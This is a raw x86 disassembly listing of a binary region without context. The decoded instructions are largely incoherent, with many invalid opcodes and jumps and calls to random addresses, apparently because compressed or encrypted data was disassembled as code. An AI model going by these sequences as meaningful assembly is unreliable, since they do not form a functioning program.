  41021f:	aam    0xfd
  410221:	(bad)  
  410222:	sti    
  410223:	nop
  410224:	notrack jmp DWORD PTR [eax+ebp*8-0x1753174d]
  41022c:	std    
  41022d:	call   0x3e4b35
  410232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410233:	xchg   esi,eax
  410234:	loop   0x41022d
  410236:	inc    esp
  410237:	call   0xe8648822
  41023c:	std    
  41023d:	(bad)  
  41023e:	out    dx,al
  41023f:	call   0xc1e60239
  410244:	js     0x410286
  410246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410247:	call   0xf0d0b849
  41024c:	std    
  41024d:	jmp    FWORD PTR [ebx+0x38]
  410250:	notrack jmp DWORD PTR [eax+ebp*8+0x43]
  410255:	clc    
  410256:	jp     0x410243
  410258:	sti    
  410259:	push   DWORD PTR [eax+ebp*8+0x73]
  41025d:	cld    
  41025e:	mov    esi,DWORD PTR [edx+0x21130010]
  410264:	ror    DWORD PTR [eax+eax*1],0x0
	...
  410278:	and    esi,DWORD PTR ds:0xc4a0ec89
  41027e:	cli    
  41027f:	push   0x13
  410281:	ds dec ebx
  410283:	call   FWORD PTR [esi]
  410285:	pop    esp
  410286:	out    0x81,al
  410288:	push   es
  410289:	call   0xe7df8c8b
  41028e:	std    
  41028f:	jne    0x41027c
  410291:	cmp    edi,DWORD PTR [ebx+0x48]
  410294:	xchg   edx,eax
  410295:	add    edi,edi
  410297:	xor    eax,0x4100e4
  41029c:	jmp    0x410225
  41029e:	sti    
  41029f:	jmp    esp
  4102a1:	out    0x73,eax
  4102a3:	or     dl,bh
  4102a5:	test   edi,esp
  4102a7:	inc    edi
  4102a8:	cmp    ebp,DWORD PTR [esi-0x26]
  4102ab:	add    edx,edi
  4102ad:	ins    DWORD PTR es:[edi],dx
  4102ae:	and    bh,0x77
  4102b1:	pusha  
  4102b2:	gs (bad) 
  4102b4:	popf   
  4102b5:	loopne 0x41031d
  4102b7:	dec    BYTE PTR [edi]
  4102b9:	pop    dx
  4102bb:	xchg   ebx,eax
  4102bc:	iret   
  4102bd:	gs enterw 0x69b8,0x2
  4102c3:	push   ebp
  4102c4:	jno    0x41030f
  4102c6:	add    ebx,0x69cf1776
  4102cc:	cli    
  4102cd:	mov    bl,0xb5
  4102cf:	(bad)  
  4102d0:	out    dx,eax
  4102d1:	push   ebp
  4102d2:	pop    edx
  4102d3:	xor    eax,0x8865971f
  4102d8:	mov    edi,0x3479b1
	...
  4102ed:	add    BYTE PTR [edx+0x70ffc335],dh
  4102f3:	inc    eax
  4102f4:	(bad)  
  4102f5:	daa    
  4102f6:	mov    ebx,0xfa3e826d
  4102fb:	stc    
  4102fc:	shl    BYTE PTR [edi+0x12],0x15
  410300:	(bad)  
  410303:	jne    0x4102ee
  410305:	adc    edx,edi
  410307:	ins    DWORD PTR es:[edi],dx
  410308:	stc    
  410309:	mov    edi,0xe7cc4e8e
  41030e:	ins    BYTE PTR es:[edi],dx
  41030f:	xchg   esp,eax
  410310:	gs (bad) 
  410312:	stos   BYTE PTR es:[edi],al
  410313:	xor    eax,0x770d0002
  410318:	fisub  DWORD PTR [eax]
  41031a:	inc    ebx
  41031b:	lods   eax,DWORD PTR ds:[esi]
  41031c:	add    dl,BYTE PTR [eax-0x13]
  41031f:	mov    eax,ds:0x488ae7fa
  410324:	gs (bad) 
  410326:	rcr    al,cl
  410328:	and    eax,0x3c3d5ff
  41032d:	inc    esi
  41032e:	jp     0x410335
  410330:	out    0x3,eax
  410332:	dec    edi
  410333:	pop    ebx
  410334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410335:	or     BYTE PTR [di+0x4f],al
  410339:	data16 mov ah,0x5e
  41033c:	or     eax,0xee1d5f71
  410341:	lock pusha 
  410343:	pop    esi
  410344:	jae    0x4103ad
  410346:	pushf  
  410347:	fsub   st,st(0)
  410349:	pop    ebx
  41034a:	in     eax,dx
  41034b:	pop    ds
  41034c:	out    dx,al
  41034d:	gs sub al,0xbf
  410350:	scas   eax,DWORD PTR es:[edi]
  410351:	inc    edx
	...
  410362:	add    BYTE PTR [eax],al
  410364:	stc    
  410365:	add    al,0x34
  410367:	jns    0x4102fa
  410369:	sub    BYTE PTR [eax+ebp*2-0x4abcfb1d],0x6c
  410371:	fdiv   st,st(0)
  410373:	pop    ebx
  410374:	mov    ds:0x7265be21,eax
  410379:	enter  0xdab4,0x55
  41037d:	out    0x1e,al
  41037f:	mov    ebx,0x161104ba
  410384:	mov    bl,0xc3
  410386:	call   0xc05f09ef
  41038b:	ret    0x6635
  41038e:	push   0xf15e2cc2
  410393:	inc    ebx
  410394:	test   eax,0x1ddc18fb
  410399:	pop    esi
  41039a:	test   DWORD PTR [esi-0x3ce04263],esp
  4103a0:	or     eax,0xfdef65ce
  4103a5:	ins    BYTE PTR es:[edi],dx
  4103a6:	std    
  4103a7:	(bad)  
  4103a9:	pop    ebp
  4103aa:	inc    eax
  4103ab:	mov    ecx,0xdc4d5e34
  4103b0:	in     eax,dx
  4103b1:	pop    ebp
  4103b2:	push   ebp
  4103b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103b4:	pop    ebp
  4103b5:	mov    esi,0xe5ddc2af
  4103ba:	call   FWORD PTR [esi+0x2dffc490]
  4103c0:	fld    QWORD PTR ds:0x5ea5b7e8
  4103c6:	(bad)  
  4103c7:	push   ds
	...
  4103d8:	add    BYTE PTR [eax],al
  4103da:	int    0x59
  4103dc:	(bad)  
  4103dd:	pushf  
  4103de:	mov    cl,0x65
  4103e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103e1:	int    0x16
  4103e3:	pop    edi
  4103e4:	enter  0xfa2b,0x4
  4103e8:	push   ebp
  4103e9:	jb     0x41042d
  4103eb:	add    ebx,0xfffffff5
  4103ee:	(bad)  
  4103ef:	mov    dh,0x69
  4103f1:	jmp    0x5d3fd1a9
  4103f6:	xchg   BYTE PTR [ebp+0x48],ah
  4103f9:	sbb    eax,0x2c885f17
  4103fe:	loop   0x41038a
  410400:	xor    al,0x31
  410402:	push   cs
  410403:	(bad)  
  410404:	push   DWORD PTR [ecx+0x1c]
  410407:	shl    DWORD PTR [edi],0x28
  41040a:	test   BYTE PTR [esi+edi*1+0x67c865e9],0x3f
  410412:	xchg   ecx,eax
  410413:	(bad)  
  410414:	(bad)  
  410415:	cmp    eax,0xe9108fa6
  41041a:	stc    
  41041b:	or     eax,eax
  41041d:	sbb    eax,0x58e7b6ff
  410422:	jno    0x410482
  410424:	(bad)  
  410425:	sbb    DWORD PTR [esi+0x5d],eax
  410428:	dec    BYTE PTR [esi+0x2077e557]
  41042e:	cmp    DWORD PTR [ebp+0x4e],ebx
  410431:	outs   dx,BYTE PTR ds:[esi]
  410432:	sbb    al,0x5
  410434:	call   0xfe9f1ec3
  410439:	push   ecx
  41043a:	(bad)  
  41043b:	pop    ds
  41043c:	call   DWORD PTR [esi+0x0]
	...
  41044f:	add    BYTE PTR [edx+0x5],dl
  410452:	inc    esi
  410453:	imul   edx,DWORD PTR [edi],0x39007505
  410459:	call   0xfffd:0xaf1333fa
  410460:	or     al,0xe1
  410462:	lock scas al,BYTE PTR es:[edi]
  410464:	retf   
  410465:	pop    ecx
  410466:	jae    0x410423
  410468:	sbb    al,0x6b
  41046a:	cli    
  41046b:	jmp    DWORD PTR [esi+0x60]
  41046e:	out    0x2b,al
  410470:	iret   
  410471:	loope  0x410470
  410473:	pop    edi
  410474:	pop    ebp
  410475:	pop    ds
  410476:	rol    DWORD PTR [ebx+edx*4],0x4b
  41047a:	mov    esp,ebp
  41047c:	adc    BYTE PTR [ebx+edi*8],bl
  41047f:	push   esi
  410480:	je     0x4104c0
  410482:	(bad)  
  410483:	imul   esi,DWORD PTR [edx-0x1f],0xccab0873
  41048a:	cmp    edi,edi
  41048c:	pushf  
  41048d:	mov    al,BYTE PTR [ebx-0x4]
  410490:	fdivr  st,st(5)
  410492:	push   edi
  410493:	sub    BYTE PTR [edx],ah
  410495:	add    DWORD PTR [ebx+0x41291f3d],ecx
  41049b:	add    bl,dl
  41049d:	daa    
  41049e:	add    BYTE PTR [esi+eiz*1+0x69],dh
  4104a2:	or     BYTE PTR [ecx+0x22],0x1
  4104a6:	push   edi
  4104a7:	call   0x3f55ef
  4104ac:	dec    eax
  4104ad:	enter  0x1f72,0xf5
  4104b1:	call   0x414ce7
	...
  4104c6:	jl     0x4104b0
  4104c8:	dec    esi
  4104c9:	push   0xbeef0813
  4104ce:	or     ebx,edi
  4104d0:	inc    edi
  4104d1:	inc    ecx
  4104d2:	and    ebx,DWORD PTR [eax-0xfe48a03]
  4104d8:	and    esp,DWORD PTR [ebx-0x64]
  4104db:	out    0xe6,eax
  4104dd:	push   ecx
  4104de:	fucom  st(7)
  4104e0:	std    
  4104e1:	jmp    0x4104dd
  4104e3:	ins    BYTE PTR es:[edi],dx
  4104e4:	enter  0x2c7f,0x6e
  4104e8:	xlat   BYTE PTR ds:[ebx]
  4104e9:	stc    
  4104ea:	cmp    al,0xc2
  4104ec:	push   ss
  4104ed:	shl    BYTE PTR [ebx-0x2a019ce6],0x1f
  4104f4:	mov    dl,0x37
  4104f6:	cmc    
  4104f7:	nop
  4104f8:	popf   
  4104f9:	dec    BYTE PTR [edi+0x22]
  4104fc:	arpl   WORD PTR [edx+esi*8-0xb],si
  410500:	mov    al,0x3a
  410502:	mov    ch,0xf2
  410504:	ret    0xc35d
  410507:	das    
  410508:	or     BYTE PTR [eax],al
  41050a:	dec    edi
  41050b:	xlat   BYTE PTR ds:[ebx]
  41050c:	outs   dx,DWORD PTR ds:[esi]
  41050d:	xor    BYTE PTR [esi+0x23ffec59],0x80
  410514:	popa   
  410515:	je     0x410519
  410517:	push   es
  410518:	sar    DWORD PTR [edx],cl
  41051a:	test   DWORD PTR [edx-0x75],esp
  41051d:	inc    esp
  41051e:	jle    0x4104d5
  410520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410521:	dec    eax
  410522:	mov    ebx,0x274616d
  410527:	inc    esi
  410528:	rcr    bh,1
	...
  41053a:	add    BYTE PTR [eax],al
  41053c:	gs inc edx
  41053e:	popa   
  41053f:	je     0x41059f
  410541:	call   0xff1f:0x176207d7
  410548:	dec    ebp
  410549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41054a:	inc    esp
  41054b:	add    edi,edx
  41054d:	sbb    BYTE PTR [edi+0x5ea179eb],cl
  410553:	push   esi
  410554:	mov    ds:0xfa3f3ca4,al
  410559:	jne    0x41052f
  41055b:	add    BYTE PTR [ecx],bh
  41055d:	or     BYTE PTR [ecx+0x44],0x1e
  410561:	ins    DWORD PTR es:[edi],dx
  410562:	add    al,BYTE PTR [eax]
  410564:	cli    
  410565:	adc    bl,BYTE PTR [eax+ecx*2+0x74616dbb]
  41056c:	repnz add al,0x76
  41056f:	or     bh,ch
  410571:	iret   
  410572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410573:	add    ebx,DWORD PTR [esi-0x5c]
  410576:	sbb    BYTE PTR [edx+edi*8],al
  410579:	add    al,0x69
  41057b:	(bad)  
  41057d:	add    al,0xbd
  41057f:	or     ebx,ebp
  410581:	shl    al,1
  410583:	imul   esp,DWORD PTR [eax],0x10
  410586:	(bad)
  41058c:	cli    
  41058d:	ins    BYTE PTR es:[edi],dx
  41058e:	(bad)  
  41058f:	retf   0x5abc
  410592:	sbb    eax,0x66cfdd8
  410597:	sbb    al,0xad
  410599:	pop    edx
  41059a:	dec    ecx
  41059b:	or     al,0x31
  41059d:	(bad)  
  41059e:	call   0x41068a
	...
  4105af:	add    BYTE PTR [eax],al
  4105b1:	add    BYTE PTR [eax+edx*1+0x4fa03e9],bl
  4105b8:	bound  eax,QWORD PTR [edi+0x19]
  4105bb:	pop    edx
  4105bc:	mov    bl,0x3
  4105be:	cli    
  4105bf:	add    al,0xe9
  4105c1:	mov    dh,0x2d
  4105c3:	in     eax,dx
  4105c4:	cmp    DWORD PTR ds:0xc2410535,0x50
  4105cb:	(bad)
  4105ce:	(bad)  [ebx+0x4fa040b]
  4105d4:	jmp    0xb64dd439
  4105d9:	stc    
  4105da:	jp     0x4105f6
  4105dc:	add    al,ah
  4105de:	add    eax,0x79011d05
  4105e3:	pop    ebp
  4105e4:	clc    
  4105e5:	xlat   BYTE PTR ds:[ebx]
  4105e6:	add    al,BYTE PTR [edx+0x2b]
  4105e9:	pusha  
  4105ea:	cli    
  4105eb:	add    al,0xe9
  4105ed:	add    edx,DWORD PTR [ecx]
  4105ef:	hlt    
  4105f0:	test   DWORD PTR [edi],edx
  4105f2:	repz int 0x27
  4105f5:	add    al,0x15
  4105f7:	adc    BYTE PTR [eax],al
  4105f9:	in     al,0x3e
  4105fb:	(bad)  
  4105fe:	inc    edi
  4105ff:	adc    edi,edi
  410601:	data16 ja 0x41064a
  410604:	pop    ss
  410605:	push   edx
  410606:	ret    
  410607:	mov    al,0x8a
  410609:	inc    ebp
  41060a:	jg     0x4105bc
  41060c:	or     esp,DWORD PTR [edx-0x43]
  41060f:	or     edi,edi
  410611:	mov    ebx,0x817f89f1
	...
  410626:	add    BYTE PTR [eax],al
  410628:	inc    BYTE PTR [eax+eax*1]
  41062b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41062d:	or     eax,0x5a32698f
  410632:	(bad)  
  410633:	jmp    0x6e50da92
  410638:	jle    0x4105cf
  41063a:	(bad)  
  41063b:	call   0xdc7d8c39
  410640:	mov    dh,0xc4
  410642:	(bad)  
  410643:	call   0xb53ffb0d
  410648:	add    dh,cl
  41064a:	inc    eax
  41064b:	jmp    0xa24e176a
  410650:	mov    eax,0xe301e659
  410655:	pop    ecx
  410656:	(bad)  
  410657:	mov    eax,ds:0xe90004f9
  41065c:	lods   al,BYTE PTR ds:[esi]
  41065d:	inc    ebx
  41065e:	and    ebp,ecx
  410660:	pop    ebp
  410661:	mov    al,BYTE PTR [ecx+ebp*8]
  410664:	stc    
  410665:	add    al,0x0
  410667:	push   0xffffffc2
  410669:	add    eax,0x9f9f683
  41066e:	test   esi,ebp
  410670:	ficomp DWORD PTR [edx-0x2]
  410673:	jb     0x4106a9
  410675:	pop    ebp
  410676:	pop    esi
  410677:	mov    al,0xbf
  410679:	add    eax,0x4e1e3f00
  41067e:	fisubr DWORD PTR [ecx]
  410680:	(bad)  
  410681:	pop    esp
  410682:	jno    0x410684
  410684:	adc    al,al
  410686:	std    
  410687:	mov    ecx,DWORD PTR [edx+0x28]
  41068a:	test   BYTE PTR [ebx+0x0],0x0
	...
  41069d:	add    BYTE PTR [edx+0x6d],bl
  4106a0:	jle    0x41064a
  4106a2:	and    DWORD PTR [esi],eax
  4106a4:	mov    ecx,ecx
  4106a6:	xor    eax,0xfbebc788
  4106ab:	mov    edi,eax
  4106ad:	add    ebx,DWORD PTR ds:0x5850c789
  4106b3:	retf   
  4106b4:	out    0xa7,al
  4106b6:	in     eax,0x4
  4106b8:	add    BYTE PTR [ebx-0x367663f6],cl
  4106be:	loopne 0x410682
  4106c0:	mov    ecx,ecx
  4106c2:	gs or  esi,esi
  4106c5:	jne    0x4106b6
  4106c7:	inc    ebp
  4106c8:	rcl    DWORD PTR [ebp+0x28],0xe8
  4106cc:	data16 or bh,ah
  4106cf:	inc    ebx
  4106d0:	(bad)  
  4106d1:	test   DWORD PTR [ecx+0x28ffc303],0xe30b063f
  4106db:	das    
  4106dc:	or     ch,bl
  4106de:	sahf   
  4106df:	out    0x6,al
  4106e1:	(bad)  
  4106e2:	fwait
  4106e3:	inc    esp
  4106e4:	jle    0x41071e
  4106e6:	xchg   ebx,eax
  4106e7:	cmp    eax,0xda1c9f4
  4106ec:	add    BYTE PTR [ebp-0x28],dl
  4106ef:	aam    0x81
  4106f1:	les    ecx,FWORD PTR [edi-0x6c]
  4106f4:	data16 xor BYTE PTR [edi+0x11f7fe41],dl
  4106fb:	add    al,bl
  4106fd:	call   FWORD PTR [esi+ecx*2+0xf2]
	...
  410714:	push   ebx
  410715:	add    al,0x0
  410717:	sub    edi,DWORD PTR [eax]
  410719:	jbe    0x41075e
  41071b:	cld    
  41071c:	repz mov bh,0x73
  41071f:	or     dl,bh
  410721:	test   DWORD PTR [eax+0xd],edi
  410724:	cli    
  410725:	ins    DWORD PTR es:[edi],dx
  410726:	xchg   DWORD PTR [edi+0x745d98a2],edi
  41072c:	add    dh,BYTE PTR [esi+0x28]
  41072f:	xor    al,0xd
  410731:	iret   
  410732:	mov    WORD PTR [edx+eax*1+0x2e],es
  410736:	mov    ah,0xe7
  410738:	mov    fs,WORD PTR [ecx]
  41073a:	pop    edi
  41073b:	inc    BYTE PTR [ebx+0x67fe56a0]
  410741:	mov    dl,0x6b
  410743:	push   ebx
  410744:	imul   DWORD PTR [ebp+0x2]
  410747:	or     edi,DWORD PTR [edx+0x4ffef699]
  41074d:	(bad)  
  41074e:	pop    esi
  41074f:	je     0x410717
  410751:	jge    0x4107bd
  410753:	xchg   DWORD PTR [esi],eax
  410755:	daa    
  410756:	pop    edi
  410757:	inc    BYTE PTR [edi+0x22]
  41075a:	ins    BYTE PTR es:[edi],dx
  41075b:	inc    ecx
  41075c:	pop    es
  41075d:	outs   dx,BYTE PTR ds:[esi]
  41075e:	add    bh,bh
  410760:	daa    
  410761:	pushw  0xfff3
  410764:	out    dx,eax
  410765:	push   es
  410766:	pop    edi
  410767:	sbb    BYTE PTR [edi],0x5a
  41076a:	add    dh,BYTE PTR [esp+esi*8+0x75]
  41076e:	daa    
  41076f:	dec    ebx
  410770:	cmp    ebp,DWORD PTR [esi+0x5d]
  410773:	je     0x410703
  410775:	add    eax,0xd93
	...
  41078a:	cli    
  41078b:	ins    DWORD PTR es:[edi],dx
  41078c:	or     eax,eax
  41078e:	out    dx,al
  41078f:	pusha  
  410790:	cdq    
  410791:	add    dl,bh
  410793:	ins    DWORD PTR es:[edi],dx
  410794:	add    bh,bh
  410796:	out    dx,eax
  410797:	xor    DWORD PTR [edx+0x5],ebp
  41079a:	push   ds
  41079b:	aas    
  41079c:	pop    ebp
  41079d:	mov    bh,BYTE PTR [ecx]
  41079f:	and    cl,BYTE PTR [ebp-0x3f]
  4107a2:	imul   BYTE PTR [ebp-0x49]
  4107a5:	mov    dl,BYTE PTR [esi-0x3b]
  4107a8:	popf   
  4107a9:	fstp   TBYTE PTR [edx-0x54a416fc]
  4107af:	add    eax,0xd12c5eaa
  4107b4:	loopne 0x410821
  4107b6:	(bad)  
  4107b7:	push   cs
  4107b8:	mov    ds,WORD PTR [esi-0x6d]
  4107bb:	or     al,0x11
  4107bd:	daa    
  4107be:	loop   0x410785
  4107c0:	call   0x814d8e23
  4107c5:	fmul   st(5),st
  4107c7:	push   edi
  4107c8:	ins    DWORD PTR es:[edi],dx
  4107c9:	jmp    0x2bf1f4c3
  4107ce:	cmp    eax,DWORD PTR ds:0x6cf5d85e
  4107d4:	ret    0xe51b
  4107d7:	push   esi
  4107d8:	dec    ebp
  4107d9:	fdiv   st,st(5)
  4107db:	ins    BYTE PTR es:[edi],dx
  4107dc:	xor    al,0x60
  4107de:	aam    0x56
  4107e0:	add    BYTE PTR [edx+edi*8],0x4
  4107e4:	jmp    0xe942c335
  4107e9:	mov    eax,0x47696970
	...
  4107fe:	add    BYTE PTR [eax],al
  410800:	lods   eax,DWORD PTR ds:[esi]
  410801:	in     eax,dx
  410802:	jecxz  0x410844
  410804:	in     eax,dx
  410805:	add    al,0x11
  410807:	sar    edx,1
  410809:	inc    ecx
  41080a:	or     eax,0x609265e
  41080f:	fdivr  st,st(5)
  410811:	ins    BYTE PTR es:[edi],dx
  410812:	js     0x41082d
  410814:	lea    edx,[esi+0x2d]
  410817:	enter  0x481,0xe9
  41081b:	add    edi,edx
  41081d:	xchg   DWORD PTR [ebx],ebp
  41081f:	pop    esp
  410820:	(bad)
  410823:	enter  0x4ba,0xc1
  410827:	dec    edx
  410828:	mov    ebp,0x3a09cd55
  41082d:	ror    DWORD PTR [edx],1
  41082f:	mov    ah,0x78
  410831:	fadd   st,st(0)
  410833:	hlt    
  410834:	(bad)  
  410835:	out    dx,al
  410836:	inc    DWORD PTR [edx+0x4e]
  410839:	(bad)  
  41083a:	(bad)  
  41083b:	xor    al,0xea
  41083d:	ins    BYTE PTR es:[edi],dx
  41083e:	fnclex 
  410840:	(bad)  
  410841:	push   esi
  410842:	or     ch,BYTE PTR [ecx+0x2cc6ff52]
  410848:	call   0x646c:0xf9e9fe55
  41084f:	ret    0x56b6
  410852:	mov    ah,BYTE PTR [edx+ebx*4]
  410855:	dec    esp
  410856:	shl    ecx,0xf9
  410859:	scas   eax,DWORD PTR es:[edi]
  41085a:	mov    bh,BYTE PTR [ebp+0x4b]
  41085d:	ficomp WORD PTR [edi+0x44]
  410860:	mov    esi,0xdbf655
	...
  410875:	add    al,bh
  410877:	inc    ecx
  410878:	inc    BYTE PTR [edx]
  41087a:	and    edx,DWORD PTR [edi+0x74]
  41087d:	loope  0x4108d0
  41087f:	mov    edi,0xb3746fe
  410884:	shr    dh,0x75
  410887:	outs   dx,DWORD PTR ds:[esi]
  410888:	(bad)  
  410889:	call   0xe1b55e87
  41088e:	push   ecx
  41088f:	pop    edx
  410890:	xor    DWORD PTR [esi],esp
  410892:	push   edi
  410893:	or     eax,eax
  410895:	xchg   esp,eax
  410896:	hlt    
  410897:	imul   ecx,DWORD PTR [ecx-0xfb0617],0xffffff94
  41089e:	in     eax,dx
  41089f:	push   ebp
  4108a0:	je     0x410893
  4108a2:	and    edi,ebx
  4108a4:	(bad)  
  4108a5:	(bad)  
  4108a6:	cs push edi
  4108a8:	je     0x41088b
  4108aa:	adc    DWORD PTR [edi],ecx
  4108ac:	cmp    ch,dh
  4108ae:	push   ds
  4108af:	or     eax,eax
  4108b1:	pop    esp
  4108b2:	clc    
  4108b3:	imul   esi,DWORD PTR [eax-0x22],0xa0e7fd44
  4108ba:	add    DWORD PTR [esi-0x2],edx
  4108bd:	loop   0x410878
  4108bf:	rol    BYTE PTR [ecx],1
  4108c1:	add    BYTE PTR [eax],ch
  4108c3:	fs std 
  4108c5:	jne    0x410912
  4108c7:	jmp    0xb8cd41eb
  4108cc:	or     eax,eax
  4108ce:	push   es
  4108cf:	add    ebp,ebx
  4108d1:	push   ebp
  4108d2:	or     ecx,DWORD PTR [edi-0x47dcbedb]
  4108d8:	jae    0x4108e2
	...
  4108ea:	add    BYTE PTR [eax],al
  4108ec:	jnp    0x410889
  4108ee:	cmp    bh,bh
  4108f0:	ins    BYTE PTR es:[edi],dx
  4108f1:	or     al,0xc0
  4108f3:	jne    0x410916
  4108f5:	in     al,dx
  4108f6:	inc    eax
  4108f7:	inc    DWORD PTR [esi]
  4108f9:	or     eax,ebp
  4108fb:	call   0x2e53:0xbfdb84b
  410902:	add    bl,ch
  410904:	pop    ss
  410905:	mov    dl,0x73
  410907:	or     BYTE PTR [ebx-0x4a],cl
  41090a:	dec    DWORD PTR ss:[ebp+edi*8-0x41]
  41090f:	jne    0x4108e2
  410911:	frstor [edi+edi*8]
  410914:	xchg   esi,eax
  410915:	add    al,ch
  410917:	xchg   ecx,edx
  410919:	mov    cl,0xfd
  41091b:	or     DWORD PTR [ebx],0x28
  41091e:	ja     0x410922
  410920:	clc    
  410921:	enter  0xc009,0x97
  410925:	push   ebp
  410926:	cmp    eax,DWORD PTR [eax]
  410928:	mov    ds:0x9f72fe58,eax
  41092d:	ins    DWORD PTR es:[edi],dx
  41092e:	(bad)  
  41092f:	call   DWORD PTR [ebx+0x3805eb08]
  410935:	add    eax,0x7da30000
  41093a:	rcr    DWORD PTR [ebx-0x26],0xc5
  41093e:	push   es
  41093f:	add    BYTE PTR [esi+0x7d],ah
  410942:	jmp    0x5b00:0x3f0f0268
  410949:	cmp    edi,edi
  41094b:	ret    0x3afa
  41094e:	pop    edx
  41094f:	je     0x410951
	...
  410961:	add    dh,ch
  410963:	inc    edx
  410964:	rol    BYTE PTR [edi],1
  410966:	bound  eax,QWORD PTR [ebx+ebx*2]
  410969:	dec    BYTE PTR [ebp+0x57]
  41096c:	inc    edx
  41096d:	je     0x41094f
  41096f:	call   0xe80c:0x193d0bd0
  410976:	or     eax,0x1fe5aab
  41097b:	sahf   
  41097c:	ror    BYTE PTR [edx],1
  41097e:	and    eax,0xa7ff07f1
  410983:	gs push 0x7
  410986:	adc    eax,0x38c85a8b
  41098b:	push   esi
  41098c:	add    dl,BYTE PTR [ebp+0x71]
  41098f:	mov    al,BYTE PTR [esi-0x4d10e93d]
  410995:	addr16 pop edx
  410997:	int3   
  410998:	ret    
  410999:	jmp    ebp
  41099b:	das    
  41099c:	add    eax,ebx
  41099e:	in     eax,0x6
  4109a0:	aas    
  4109a1:	out    0xb8,eax
  4109a3:	xchg   esi,eax
  4109a4:	pop    ecx
  4109a5:	(bad)  
  4109a6:	mov    ebp,0xcdff66a0
  4109ab:	pop    ebp
  4109ac:	add    cl,BYTE PTR [ebp-0x184c35c1]
  4109b2:	jae    0x410a00
  4109b4:	pop    ecx
  4109b5:	(bad)  
  4109b6:	jns    0x410960
  4109b8:	jmp    WORD PTR [esi]
  4109bb:	push   es
  4109bc:	mov    DWORD PTR [esi+edx*4-0x73],eax
  4109c0:	push   0x79
  4109c2:	jmp    0x4109c6
  4109c4:	pop    ebx
  4109c5:	add    BYTE PTR [eax],0x0
	...
  4109d8:	pop    ss
  4109d9:	cli    
  4109da:	add    esi,DWORD PTR [ebp+0x3]
  4109dd:	loope  0x41099f
  4109df:	jmp    0x410a0b
  4109e1:	push   es
  4109e2:	out    dx,eax
  4109e3:	xor    BYTE PTR [ebp+0x62],bh
  4109e6:	test   DWORD PTR [esi+eiz*2+0x4],edi
  4109ea:	jmp    0xe8c37ff9
  4109ef:	add    edi,edx
  4109f1:	sub    DWORD PTR [ebx],0x5353ad54
  4109f7:	push   0x5ac5dd5d
  4109fc:	dec    esp
  4109fd:	xchg   eax,eax
  4109ff:	add    al,0xcf
  410a01:	shl    DWORD PTR [ebp-0x1b],1
  410a04:	adc    al,0xc6
  410a06:	call   0x2b8cdc79
  410a0b:	pusha  
  410a0c:	add    eax,DWORD PTR ds:0xc93d03e9
  410a12:	add    BYTE PTR [ebx],0xfa
  410a15:	add    al,0xe9
  410a17:	mov    BYTE PTR [esi-0x79a4e7a4],bh
  410a1d:	pusha  
  410a1e:	adc    eax,0x75ae086c
  410a23:	pop    edx
  410a24:	lock inc esp
  410a26:	hlt    
  410a27:	repz js 0x4109fa
  410a2a:	push   eax
  410a2b:	add    esp,DWORD PTR [esi-0x1]
  410a2e:	pop    ebp
  410a2f:	rcr    ch,1
  410a31:	pop    ebp
  410a32:	adc    DWORD PTR [ecx-0x24],ebx
  410a35:	push   edx
  410a36:	popa   
  410a37:	cmp    edx,esp
  410a39:	fcom   DWORD PTR [eax+0x6b]
	...
  410a4c:	add    BYTE PTR [eax],al
  410a4e:	sbb    al,0x14
  410a50:	ds pop edx
  410a52:	lock sub eax,0xd078f0bb
  410a58:	inc    esp
  410a59:	add    ebp,DWORD PTR [esi]
  410a5b:	add    ah,BYTE PTR [esi]
  410a5d:	enter  0xdd99,0x70
  410a61:	mul    BYTE PTR [ebp-0xf89ffae]
  410a67:	add    al,0xe9
  410a69:	outs   dx,BYTE PTR ds:[esi]
  410a6a:	dec    esp
  410a6b:	pop    esi
  410a6c:	out    0xc2,eax
  410a6e:	or     eax,0x83d0e912
  410a73:	retf   0x68ff
  410a76:	loopne 0x410a7c
  410a78:	je     0x410a5f
  410a7a:	add    al,0x2e
  410a7c:	jae    0x410a05
  410a7e:	jmp    FWORD PTR ds:0x257f973
  410a84:	lea    ebp,[esi+eax*8]
  410a87:	shl    DWORD PTR [edi-0x10],0x46
  410a8b:	vaddsubps ymm3,ymm0,YMMWORD PTR [esi-0x5c410137]
  410a93:	fsubr  st,st(3)
  410a95:	ror    esi,0x21
  410a98:	jmp    FWORD PTR [esi+0x425e4787]
  410a9e:	rol    DWORD PTR [esi+0x54],0x72
  410aa2:	xchg   edx,eax
  410aa3:	test   bl,al
  410aa5:	dec    ecx
  410aa6:	rcl    BYTE PTR [edx-0x2],0x36
  410aaa:	dec    eax
  410aab:	jmp    0xfbf6:0x5236a64f
	...
  410ac2:	add    BYTE PTR [eax],al
  410ac4:	clc    
  410ac5:	inc    ebp
  410ac6:	(bad)  
  410ac7:	ss mov ecx,0x79e9412a
  410acd:	adc    al,BYTE PTR [eax]
  410acf:	imul   BYTE PTR [ebp+0x3f]
  410ad2:	add    cl,ch
  410ad4:	stc    
  410ad5:	jg     0x410a5b
  410ad7:	pop    ebp
  410ad8:	inc    eax
  410ad9:	push   ebx
  410ada:	(bad)  
  410adb:	mov    ecx,0xa12f698a
  410ae0:	xor    dl,BYTE PTR [ebx+0xa]
  410ae3:	sub    ebx,esi
  410ae5:	mov    BYTE PTR [ebx-0x7cfb0618],ah
  410aeb:	ins    BYTE PTR es:[edi],dx
  410aec:	dec    edx
  410aed:	push   eax
  410aee:	(bad)  
  410aef:	test   BYTE PTR es:[ecx],0x84
  410af3:	jbe    0x410aee
  410af5:	add    al,0x0
  410af7:	fs sbb eax,0x330efdaa
  410afd:	ret    0xfe
  410b00:	into   
  410b01:	mov    ah,0xfc
  410b03:	inc    DWORD PTR [ebp+ebx*8-0x537bc814]
  410b0a:	sub    esi,esi
  410b0c:	fiadd  DWORD PTR [ecx-0x53ab015e]
  410b12:	jmp    0xb63d184e
  410b17:	test   ch,dh
  410b19:	mov    al,ds:0x9544fffc
  410b1e:	cmp    ax,0x4608
  410b22:	dec    BYTE PTR [esi+ebx*8+0xfffcc7]
	...
  410b39:	add    BYTE PTR [ebp+edx*4+0x51841e6],al
